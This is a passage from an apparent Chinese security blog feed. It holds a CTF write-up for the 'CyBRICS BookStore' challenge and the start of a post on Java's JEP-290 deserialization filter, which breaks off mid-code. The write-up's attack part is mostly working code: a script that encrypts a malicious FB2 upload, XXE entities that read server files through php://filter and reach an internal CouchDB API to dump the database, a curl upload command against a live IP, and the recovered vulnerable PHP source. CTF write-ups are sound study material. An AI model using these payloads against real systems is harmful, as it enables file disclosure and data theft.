class="number">27</span>, <span class="number">129</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">244</span>, <span class="number">42</span>, <span class="number">191</span>, <span class="number">242</span>, <span class="number">188</span>, <span class="number">254</span>, <span class="number">166</span>, <span class="number">59</span>, <span class="number">232</span>, <span class="number">94</span>, <span class="number">237</span>, <span class="number">209</span>,</span><br><span class="line">    <span class="number">192</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">238</span>, <span class="number">147</span>, <span class="number">6</span>, <span class="number">244</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">184</span>, <span class="number">235</span>, <span class="number">16</span>, <span class="number">53</span>, <span class="number">81</span>, <span class="number">121</span>, <span class="number">248</span>,</span><br><span class="line">    <span class="number">117</span>, <span class="number">158</span>, <span class="number">17</span>, <span class="number">87</span>, <span class="number">247</span>, <span class="number">205</span>, <span class="number">16</span>, <span class="number">129</span>, <span class="number">123</span>, <span class="number">255</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">11</span>, <span class="number">98</span>, <span class="number">58</span>, <span class="number">125</span>, <span class="number">181</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">85</span>, <span class="number">100</span>, <span class="number">205</span>, <span class="number">190</span>, <span class="number">84</span>, <span class="number">226</span>, <span class="number">217</span>, <span class="number">214</span>, <span class="number">115</span>, <span class="number">62</span>,</span><br><span class="line">    <span class="number">216</span>, <span class="number">239</span>, <span class="number">44</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">135</span>, <span class="number">142</span>, <span class="number">248</span>, <span class="number">240</span>, <span class="number">180</span>, <span class="number">157</span>, <span class="number">41</span>, <span class="number">105</span></span><br><span class="line">]</span><br><span class="line">Pminus = [</span><br><span class="line">    <span class="string">'\f'</span>, <span class="string">'\x0F'</span>, <span class="string">'\x0E'</span>, <span class="string">'\b'</span>, <span class="string">'\x03'</span>, <span class="string">'\v'</span>, <span class="string">'\r'</span>, <span class="string">'\0'</span>, <span class="string">'\a'</span>, <span class="string">'\t'</span>, <span class="string">'\n'</span>,</span><br><span class="line">    <span class="string">'\x06'</span>, <span class="string">'\x02'</span>, <span class="string">'\x01'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span></span><br><span class="line">]</span><br><span class="line">rPminus = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seq, c <span class="keyword">in</span> enumerate(Pminus):</span><br><span class="line">    Pminus[seq] = ord(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    rPminus.append(Pminus.index(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    block = bytearray(block)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        tmp = bytearray([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)])</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            tmp[l] = block[rPminus[l]]</span><br><span class="line">        block = tmp</span><br><span class="line">        block = get_solve(list(block))</span><br><span class="line">    <span class="keyword">return</span> bytearray(block)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = zlib.compress(data)</span><br><span class="line">    data = bytearray(data)</span><br><span class="line">    pad = <span class="number">16</span> - len(data) % <span class="number">16</span></span><br><span class="line">    data.extend([pad <span class="keyword">for</span> _ <span class="keyword">in</span> range(pad)])</span><br><span class="line">    </span><br><span class="line">    enc = bytearray()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">16</span>):</span><br><span class="line">        enc.extend(encrypt_block(data[i:i + <span class="number">16</span>]))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">r = encrypt(open(<span class="string">'evil.xml'</span>).read())</span><br><span class="line">open(<span class="string">'evil.fb2enc'</span>, <span class="string">'w'</span>).write(r)</span><br></pre></td></tr></table></figure>

<p>接下来构造恶意 xml 并加密上传, 这个可以把正文给删了, 节省加密时间</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/proc/self/cwd/index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FictionBook</span> <span class="attr">xmlns:l</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.gribuser.ru/xml/fictionbook/2.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">genre</span>&gt;</span>fiction<span class="tag">&lt;/<span class="name">genre</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Антуан<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>де Сент<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Экзюпери<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-title</span>&gt;</span>Маленький Принц<span class="tag">&lt;/<span class="name">book-title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">annotation</span>&gt;</span></span><br><span class="line">                123</span><br><span class="line">            <span class="tag">&lt;/<span class="name">annotation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">coverpage</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">l:href</span>=<span class="string">"#cover.jpg"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">coverpage</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">lang</span>&gt;</span>ru<span class="tag">&lt;/<span class="name">lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-lang</span>&gt;</span>fr<span class="tag">&lt;/<span class="name">src-lang</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">translator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Нора<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Галь<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">home-page</span>&gt;</span>http://www.vavilon.ru/noragal/content.html<span class="tag">&lt;/<span class="name">home-page</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">translator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title-info</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">document-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Дмитрий<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">middle-name</span>&gt;</span>Петрович<span class="tag">&lt;/<span class="name">middle-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span>&gt;</span>Грибов<span class="tag">&lt;/<span class="name">last-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>grib@gribuser.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">first-name</span>&gt;</span>Faiber<span class="tag">&lt;/<span class="name">first-name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">last-name</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>faiber@yandex.ru<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">program-used</span>&gt;</span>FB Tools<span class="tag">&lt;/<span class="name">program-used</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">date</span>&gt;</span>2006-01-14<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-url</span>&gt;</span>http://www.vavilon.ru/noragal/pp/<span class="tag">&lt;/<span class="name">src-url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">src-ocr</span>&gt;</span>Справочная Служба Русского Языка<span class="tag">&lt;/<span class="name">src-ocr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>0CB33702-6AE9-4377-9AFA-3BA2EF2F37F6<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">history</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.1 — дополнительное форматирование — Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>v 1.2 — изменена обложка — Faiber<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">history</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">publish-info</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">book-name</span>&gt;</span>Маленький Принц<span class="tag">&lt;/<span class="name">book-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">city</span>&gt;</span>Фрунзе<span class="tag">&lt;/<span class="name">city</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">year</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">publish-info</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">custom-info</span> <span class="attr">info-type</span>=<span class="string">"general"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Антуан де Сент-Экзюпери<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">empty-line</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Маленький принц<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">            123</span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FictionBook</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后利用 xxe, 就能读文件了, 这里各种尝试, fuzz 出来 <code>/proc/self/cwd/index.php</code>, 可以直接读到源码.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">save2db</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">"Content-type: application/json"</span>,</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        $data = json_encode($data);</span><br><span class="line">            </span><br><span class="line">        $myCurl = curl_init();</span><br><span class="line">        curl_setopt_array($myCurl, <span class="keyword">array</span>(</span><br><span class="line">            CURLOPT_URL =&gt; <span class="string">'http://127.0.0.1:5984/library'</span>,</span><br><span class="line">            CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_HTTPHEADER =&gt; $headers,</span><br><span class="line">            CURLOPT_ENCODING =&gt; <span class="string">'gzip,deflate'</span>,</span><br><span class="line">            CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">            CURLOPT_POSTFIELDS =&gt; $data</span><br><span class="line">        ));</span><br><span class="line">        $response = curl_exec($myCurl);</span><br><span class="line">        curl_close($myCurl);</span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">($xmlfile)</span> </span>&#123;</span><br><span class="line">        libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT);</span><br><span class="line">        $creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Description not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Title info not found"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $titleinfo = $creds-&gt;description-&gt;&#123;<span class="string">'title-info'</span>&#125;;</span><br><span class="line">        <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!property_exists($titleinfo, $item)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $item . <span class="string">" not found"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        save2db([<span class="string">'title'</span> =&gt; base64_encode($titleinfo-&gt;&#123;<span class="string">'book-title'</span>&#125;), <span class="string">'date'</span> =&gt; $titleinfo-&gt;&#123;<span class="string">'date'</span>&#125;, <span class="string">'url'</span> =&gt; bin2hex(random_bytes(<span class="number">16</span>))]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $titleinfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $results = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"newbook"</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">'newbook'</span>][<span class="string">'error'</span>] == UPLOAD_ERR_OK</span><br><span class="line">            &amp;&amp; is_uploaded_file($_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line"></span><br><span class="line">            $name = $_FILES[<span class="string">'newbook'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            exec(<span class="string">"/var/www/main d "</span> . $name . <span class="string">" "</span> . $name . <span class="string">".decoded"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!is_file($name . <span class="string">".decoded"</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Decoding ERROR"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                $data = file_get_contents($name . <span class="string">".decoded"</span>);</span><br><span class="line">                $data = gzuncompress($data);</span><br><span class="line">                $results = process($data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;<span class="keyword">New</span> CyBRICS BookStore&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=<span class="string">"../css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-white border-bottom box-shadow"&gt;</span><br><span class="line">    &lt;h5 class="my-0 mr-md-auto font-weight-normal"&gt;CyBRICS BookStore&lt;/h5&gt;</span><br><span class="line">    &lt;nav class="my-2 my-md-0 mr-md-3"&gt;</span><br><span class="line">        &lt;a class="p-2 text-dark" href="#"&gt;Authors zone&lt;/a&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;a class="btn btn-outline-primary" href="#"&gt;Sign up&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="pricing-header px-3 py-3 pt-md-5 pb-md-4 mx-auto text-center"&gt;</span><br><span class="line">    &lt;h1 class="display-4"&gt;Authors zone&lt;/h1&gt;</span><br><span class="line">    &lt;p class="lead"&gt;Our site is under development, but you already can &lt;a href=""&gt;download DRM&lt;/a&gt; and demo books&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;You can add your book&lt;/h2&gt;</span><br><span class="line">        &lt;div&gt;&lt;small&gt;* You will be further informed about review results&lt;/small&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"/authorszone/index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"file"</span> name=<span class="string">"newbook"</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit for review"</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div style=<span class="string">"margin-top: 10px"</span>&gt;</span><br><span class="line">            &lt;table class="table table-striped"&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">if</span> (is_object($results)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Book is under review:&lt;/h2&gt;"</span>;</span><br><span class="line">                    <span class="keyword">foreach</span> ([<span class="string">'genre'</span>, <span class="string">'author'</span>, <span class="string">'book-title'</span>, <span class="string">'annotation'</span>, <span class="string">'date'</span>, <span class="string">'lang'</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$item.<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$results-&gt;&#123;$item&#125;-&gt;asXML().<span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> $results;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/table&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;footer class="pt-4 my-md-5 pt-md-5 border-top"&gt;</span><br><span class="line">        &lt;div class="row"&gt;</span><br><span class="line">            &lt;div class="col-12 col-md"&gt;</span><br><span class="line">                &lt;img class="mb-2" src="https://getbootstrap.com/assets/brand/bootstrap-solid.svg" alt="" width="24" height="24"&gt;</span><br><span class="line">                &lt;small class="d-block mb-3 text-muted"&gt;&amp;copy; 2018&lt;/small&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- Bootstrap core JavaScript</span><br><span class="line">================================================== --&gt;</span><br><span class="line">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span><br><span class="line">&lt;script src=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> integrity=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> crossorigin=<span class="string">"anonymous"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到为了绕过 libxml 自带的安全措施, 出题人也是煞费苦心 233.<br>在源码里面可以发现用了 <code>couchdb</code>, 好在支持 http 协议, 我们通过 http 访问 <code>couchdb</code> 的各种 API.<br>翻了翻文档, 可以发现用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:5984/library/_changes?include_docs=true" &gt;]&gt;</span></span><br></pre></td></tr></table></figure>
<p>就能直接脱裤 (比较大, 浏览器会卡死, 建议直接 curl 脱  </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl <span class="string">'http://45.77.219.97/authorszone/index.php'</span> -H <span class="string">'Cache-Control: max-age=0'</span> -H <span class="string">'Origin: http://45.77.219.97'</span> -H <span class="string">'Upgrade-Insecure-Requests: 1'</span> -H <span class="string">'DNT: 1'</span>  -H <span class="string">'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'</span> -H <span class="string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span> -H <span class="string">'Referer: http://45.77.219.97/authorszone/index.php'</span> -F <span class="string">'newbook=@evil.fb2enc'</span> --compressed --insecure -vv -o asd2.html</span><br></pre></td></tr></table></figure>
<p>得到 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;seq&quot;:1,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000a2b&quot;,&quot;_rev&quot;:&quot;1-d8bf4bb75eae1dd6117c8a59b952e27e&quot;,&quot;title&quot;:&quot;Mona Lisa Overdrive&quot;,&quot;url&quot;:&quot;4cb21fe9786c74f0b83f1fa808e30e4d&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:2,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ac6&quot;,&quot;_rev&quot;:&quot;1-4802d0cdd11425ffcc9500b5f5db9a56&quot;,&quot;title&quot;:&quot;Small Prince&quot;,&quot;url&quot;:&quot;6506dad64d2353f25cca891f81443a8e&quot;&#125;&#125;,</span><br><span class="line">&#123;&quot;seq&quot;:3,&quot;id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;changes&quot;:[&#123;&quot;rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;&#125;],&quot;doc&quot;:&#123;&quot;_id&quot;:&quot;648ed731593e7c015c96df3f21000ba3&quot;,&quot;_rev&quot;:&quot;1-094bdefdba07bc63ae11584c79c51909&quot;,&quot;title&quot;:&quot;Flag Book&quot;,&quot;url&quot;:&quot;3ba9318b509034cb7b506df0faef4d80&quot;&#125;&#125;,</span><br></pre></td></tr></table></figure>
<p>结合 url 的参数, 在 <code>http://45.77.219.97/books/3ba9318b509034cb7b506df0faef4d80.fb2enc</code> 就能下到 Flag Book 啦.<br>解密一下, 然后就可以找到在里面的 flag 一枚</p>
<p><img src="https://i.loli.net/2019/07/22/5d351ec06428750220.png" alt=""></p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>JEP-290 相关学习</title>
    <url>/2020/03/22/JEP-290-%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>官网介绍: <a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">https://openjdk.java.net/jeps/290</a>  </p>
<p>JEP = JDK Enhancement Proposals<br>就是等于改进提案.  python 也有类似的, 就是大家喜闻乐见的 PEP (Python Enhancement Proposals).  </p>
<a id="more"></a>

<p>在这个 290 里面, 干的事情就是新增一个自带的反序列化过滤器.  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Security guidelines consistently require that input from external sources be validated before use. The filter mechanism will allow object-serialization clients to more easily validate their inputs, and exported RMI objects to validate invocation arguments.</span><br></pre></td></tr></table></figure>

<p>jdk 源码里面可以看到  </p>
<p>src/java.rmi/share/classes/sun/rmi/registry/RegistryImpl.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ObjectInputFilter registryFilter =</span><br><span class="line">            AccessController.doPrivileged((PrivilegedAction&lt;ObjectInputFilter&gt;)RegistryImpl::initRegistryFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Initialize the registryFilter from the security properties or system property; if any</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> an ObjectInputFilter, or null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter <span class="title">initRegistryFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ObjectInputFilter filter = <span class="keyword">null</span>;</span><br><span class="line">    String props = System.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    <span class="keyword">if</span> (props == <span class="keyword">null</span>) &#123;</span><br><span class="line">        props = Security.getProperty(REGISTRY_FILTER_PROPNAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (props != <span class="keyword">null</span>) &#123;</span><br><span class="line">        filter = SharedSecrets.getJavaObjectInputFilterAccess().createFilter2(props);</span><br><span class="line">        Log regLog = Log.getLog(<span class="string">"sun.rmi.registry"</span>, <span class="string">"registry"</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (regLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            regLog.log(Log.BRIEF, <span class="string">"registryFilter = "</span> + filter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ObjectInputFilter.<span class="function">Status <span class="title">registryFilter</span><span class="params">(ObjectInputFilter.FilterInfo filterInfo)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (registryFilter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        